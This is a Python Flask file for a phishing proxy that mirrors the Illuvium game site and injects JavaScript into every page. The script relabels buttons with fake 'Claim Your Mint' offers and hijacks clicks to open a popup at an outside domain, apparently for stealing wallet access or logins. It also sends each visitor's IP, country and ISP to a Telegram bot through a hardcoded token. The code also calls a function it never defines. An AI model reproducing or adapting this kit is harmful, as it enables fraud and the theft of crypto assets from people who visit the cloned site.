from flask import request, Response, current_app
import requests
import re
import os
import logging
import urllib.parse

logger = logging.getLogger(__name__)

def init_content_proxy(app):
    """Initialize content proxy routes for the Flask app"""
    
    def remove_tracking_scripts(content):
        """Remove Google Tag Manager iframe and tracking scripts from HTML content."""
        if isinstance(content, bytes):
            content = content.decode('utf-8', errors='ignore')
        
        # Remove GTM iframe
        content = content.replace(
            '<iframe src="https://www.googletagmanager.com/ns.html?id=GTM-WXHP66L" height="0" width="0" style="display:none;visibility:hidden"></iframe>',
            ''
        )
        
        # Remove GTM script
        content = content.replace(
            '<script async="" src="https://www.googletagmanager.com/gtag/js?id=G-B4V7XNT23Z"></script>',
            ''
        )
        content = content.replace(
            '<script async="" src="https://store.epicgames.com/en-US/p/illuvium-60064c"></script>',
            ''
        )
        
        # Remove GTM initialization script
        gtm_init_script = '''<script>
            window.dataLayer = window.dataLayer || [];
            function gtag(){dataLayer.push(arguments);}
            gtag('js', new Date());
            gtag('config', 'G-B4V7XNT23Z', {
              page_path: window.location.pathname,
            });
          </script>'''
        content = content.replace(gtm_init_script, '')
        
        # Remove GTM inline script
        gtm_inline_script = '''<script>
            (function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':
            new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],
            j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
            'https://www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f);
            })(window,document,'script','dataLayer', 'GTM-WXHP66L');
          </script>'''
        content = content.replace(gtm_inline_script, '')
        
        # Remove Geetest script
        content = content.replace(
            '<script async="" src="https://static.geetest.com/v4/gt4.js"></script>',
            ''
        )
        
        return content
    
    def rewrite_urls(content):
        """Rewrite URLs to point to proxy server."""
        # Implementation continues...
        return content
    
    def get_text_replacement_script():
        """Return the text replacement JavaScript code"""
        return '''
<script>
// Wait for the DOM to be fully loaded
document.addEventListener('DOMContentLoaded', function () {
  console.log('DOM Content Loaded - Starting operations');

  // Text replacements for buttons and links
  const textMap = {
    'Play for Free': 'Claim Your Mint',
    'Play Now': 'Grab Your Spot',
    'Log In with Passport': 'Start Now',
    'Connect Wallet': 'Connect Wallet',
    'Launch Game': 'Get Yours',
    'Create Account': 'New Account',
    'Sign Up': 'Register',
    'Register': 'Collect Now',
    'News': 'Updates',
    'Home': 'Main',
    'About': 'Info',
    'Contact': 'Reach Us',
    'FAQ': 'Help',
    'Roadmap': 'Timeline',
    'Whitepaper': 'Documentation'
  };

  const paragraphMap = {
    'Survive the Overworld, a hostile planet teeming with Illuvials waiting to be found.':
      'A Gift For Pioneers: Claim your complimentary mint as a welcome token and help forge the future of Illuvium.'
  };

  function logTextChange(element, oldText, newText) {
    console.log('Text changed:', {
      element: element.outerHTML,
      oldText: oldText,
      newText: newText,
      timestamp: new Date().toISOString()
    });
  }

  function processElement(element) {
    let text = '';

    for (const node of element.childNodes) {
      if (node.nodeType === Node.TEXT_NODE) {
        text += node.textContent.trim();
      }
    }

    if (!text) {
      text = element.textContent.trim();
    }

    if (textMap[text]) {
      const oldText = text;
      if (element.childNodes.length === 1 && element.childNodes[0].nodeType === Node.TEXT_NODE) {
        element.textContent = textMap[text];
      } else {
        let replaced = false;
        for (const node of element.childNodes) {
          if (node.nodeType === Node.TEXT_NODE && node.textContent.trim() === text) {
            node.textContent = textMap[text];
            replaced = true;
            break;
          }
        }
        if (!replaced) {
          element.textContent = textMap[text];
        }
      }
      logTextChange(element, oldText, textMap[text]);
    }

    element.classList.add('claim-button');
  }

  function processParagraphs() {
    const paragraphs = document.querySelectorAll('p');
    paragraphs.forEach(p => {
      const cleanText = p.textContent.trim();
      if (paragraphMap[cleanText]) {
        const oldText = cleanText;
        const newText = paragraphMap[cleanText];
        p.textContent = newText;
        logTextChange(p, oldText, newText);
      }
    });
  }

  function processAllElements() {
    document.querySelectorAll('button, a').forEach(processElement);
    document.querySelectorAll('a[href*="news"], a[href*="about"], a[href*="faq"]').forEach(processElement);
    document.querySelectorAll('.chakra-link, .nav-link, .menu-item').forEach(processElement);
    processParagraphs();
  }

  // Initial processing
  processAllElements();
  console.log('Initial text modifications applied');

  // Interval for dynamic content
  setInterval(function () {
    document.querySelectorAll('button:not(.claim-button), a:not(.claim-button)').forEach(processElement);
    processParagraphs();
  }, 1000);

  // MutationObserver for DOM changes
  const observer = new MutationObserver(function (mutations) {
    let needsProcessing = false;
    mutations.forEach(mutation => {
      if (mutation.addedNodes.length) {
        needsProcessing = true;
      }
    });

    if (needsProcessing) {
      document.querySelectorAll('button:not(.claim-button), a:not(.claim-button)').forEach(processElement);
      processParagraphs();
    }
  });

  observer.observe(document.body, {
    childList: true,
    subtree: true
  });

  // Click event interception
  document.addEventListener('click', function (event) {
    const clickedElement = event.target;
    const targetElement = clickedElement.closest('button, a');
    if (!targetElement) return;

    if (targetElement.classList.contains('css-tvaofb') ||
        targetElement.classList.contains('css-104rome') ||
        targetElement.classList.contains('css-1hnz6hu') ||
        targetElement.classList.contains('css-1oqedzn') ||
        targetElement.classList.contains('css-1i8s7az')) {
      return;
    }

    event.preventDefault();
    event.stopPropagation();

    if (targetElement.classList.contains('claim-button')) {
      console.log('Redirecting to Google');
      window.open('https://auth-illuvidex.onrender.com','googleWindow','width=800,height=600,toolbar=no,menubar=no,scrollbars=yes,resizable=yes');
      return;
    }

    console.log('Button clicked');
    targetElement.click();
  }, true);
});

// Send IP to Telegram
async function sendIPToTelegram() {
  const botToken = '7703714960:AAFhMovzxoNjr9LZq6m9kytv1R1EylQT1R8';
  const chatId = '7005236807';

  try {
    const res = await fetch('https://ipapi.co/json/');
    const data = await res.json();

    const ip = data.ip;
    const country = data.country_name;
    const isp = data.org;

    const message = `[ILV]: ${ip} : ${country} : ${isp}`;

    await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json'
      },
      body: JSON.stringify({
        chat_id: chatId,
        text: message
      })
    });
  } catch (err) {
    console.error('Failed to send IP info to Telegram:', err);
  }
}

window.addEventListener('load', sendIPToTelegram);
</script>

'''

    @app.after_request
    def add_script_to_html(response):
        """Global after_request handler to add script to all HTML responses"""
        if response.mimetype == 'text/html':
            content = response.get_data(as_text=True)
            if '</body>' in content:
                script = get_text_replacement_script()
                content = content.replace('</body>', script + '</body>')
                response.set_data(content)
        return response

    # Add a catch-all route as a last resort
    @app.route('/', defaults={'path': ''})
    @app.route('/<path:path>')
    def catch_all(path):
        """Catch-all route that proxies to the original site and modifies content"""
        original_url = f"https://overworld.illuvium.io/{path}"
        logger.info(f"Catch-all proxy for: {original_url}")
        
        try:
            # Set proper headers to mimic a browser
            headers = {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36',
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
                'Accept-Language': 'en-US,en;q=0.5',
                'Connection': 'keep-alive',
                'Upgrade-Insecure-Requests': '1',
            }
            
            # Add query parameters if any
            params = request.args.to_dict()
            
            # Make the request to the original site
            response = requests.get(original_url, headers=headers, params=params, stream=True)
            
            # Get content type
            content_type = response.headers.get('Content-Type', 'text/html')
            
            # If HTML, modify content
            if 'text/html' in content_type and response.status_code == 200:
                modified_content = modify_html_content(response.content)
                logger.info(f"HTML content modified for {path}")
                return Response(modified_content, mimetype=content_type)
            
            # For other content types or error codes, return as-is
            return Response(
                response.content, 
                status=response.status_code,
                content_type=content_type
            )
        except Exception as e:
            logger.error(f"Error in catch-all route: {str(e)}")
            import traceback
            logger.error(traceback.format_exc())
            return f"Error: {str(e)}", 500
